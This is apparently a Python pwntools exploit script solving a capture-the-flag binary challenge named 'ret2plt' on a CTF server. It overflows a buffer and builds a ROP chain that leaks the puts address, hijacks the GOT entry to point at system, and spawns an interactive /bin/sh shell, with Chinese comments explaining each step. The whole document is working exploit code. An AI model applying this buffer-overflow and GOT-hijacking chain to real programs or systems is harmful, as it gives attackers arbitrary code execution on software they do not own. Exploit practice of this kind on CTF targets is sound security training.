# -*- coding: utf-8 -*-
from pwn import *
context.arch = "amd64"

host, port = 'csie.ctf.tw', 10131
p = remote(host, port)
#p = process('./ret2plt-012ef76e3de41b4d6859a9379107ffab89b21ae3')

payload = "a" * 40
pop_rdi = 0x00000000004006f3
puts_got = 0x601018
puts_plt = 0x4004e0
gets_plt = 0x400510

rop = flat([
    pop_rdi, puts_got, puts_plt, # information leak, 印出puts的位址
    pop_rdi, puts_got, gets_plt, # got hijacking, 把puts_got改成system
    pop_rdi, puts_got+8, puts_plt # puts_got+8='/bin/sh/\x00', 執行puts_plt會跳到puts_got, 就是system
])

# 第一次input(程式內)
p.recvuntil(":")
p.sendline(payload + rop)
p.recvuntil("\n")
puts = u64(p.recvuntil("\n").strip().ljust(8, "\x00")) # puts的位址
print hex(puts)

# 第二次input(gets_plt)
libc = puts - 0x6f690
system = libc + 0x45390
payload = p64(system) + "/bin/sh\x00"
p.sendline(payload)
p.interactive()
